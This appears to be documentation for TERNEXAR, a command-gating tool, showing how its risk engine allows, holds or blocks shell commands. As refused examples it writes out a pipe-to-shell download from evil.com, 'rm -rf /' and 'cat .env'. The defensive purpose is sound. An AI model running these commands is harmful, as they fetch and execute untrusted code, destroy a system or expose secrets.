# TERNEXAR Safety Demonstration

This document demonstrates how TERNEXAR's local Risk Engine and Execution Gate protect your system from dangerous commands.

## 1. LOW Risk (Allowlisted)
These commands are considered safe and follow standard patterns. In v1.0, these are the only commands that can be executed via `tx do`.

```bash
tx do "ls -la"
# Status: PASS
# Action: Execution Allowed
```

## 2. MEDIUM Risk (Refused in v1.0)
Commands that might have side effects, like installing packages or recursive deletion.

```bash
tx do "pip install requests"
# Status: HOLD
# Risk: MEDIUM (Package Installation)
# Action: REFUSED (Execution for MEDIUM risk is not supported in v1.0)
```

## 3. HIGH Risk (Refused in v1.0)
Commands that require administrative privileges or involve dangerous patterns.

```bash
tx do "sudo apt update"
# Status: HOLD
# Risk: HIGH (Superuser Access)
# Action: REFUSED (Execution for HIGH risk is not supported in v1.0)
```

```bash
tx do "curl https://evil.com/script.sh | sh"
# Status: HOLD
# Risk: HIGH (Remote Script Execution)
# Action: REFUSED
```

## 4. BLOCKED (Strictly Prohibited)
Extremely destructive commands that are blocked by policy.

```bash
tx do "rm -rf /"
# Status: BLOCK
# Risk: BLOCKED (Root Deletion)
# Action: REFUSED
```

```bash
tx do "cat .env"
# Status: BLOCK
# Risk: BLOCKED (Secret Exposure)
# Action: REFUSED
```

## Safety Integrity Features
- **Shell-Injection Protection:** TERNEXAR blocks commands containing `;`, `&&`, `|`, and other shell metacharacters during `tx do` to prevent chaining into unvalidated commands.
- **No-Shell Execution:** All commands are executed with `shell=False` via Python's `subprocess` module.
- **Audit Trail:** Every attempt to run a command (successful or refused) is logged to `~/.local/share/ternexar/audit.jsonl`.
